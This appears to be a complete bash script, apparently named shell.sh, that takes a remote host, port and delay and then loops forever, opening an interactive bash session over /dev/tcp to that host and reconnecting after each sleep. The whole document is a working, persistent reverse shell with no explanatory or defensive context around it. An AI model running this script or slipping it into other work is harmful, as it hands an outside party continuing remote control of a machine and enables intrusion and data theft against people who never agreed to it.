#!/bin/bash
if [ "$#" -ne 3 ]; then
	echo "Usage: shell.sh remote_host remote_port sleep_time_seconds"
	exit
fi
while :
do
	/bin/bash -i >& /dev/tcp/$1/$2 0>&1
	sleep $3
done
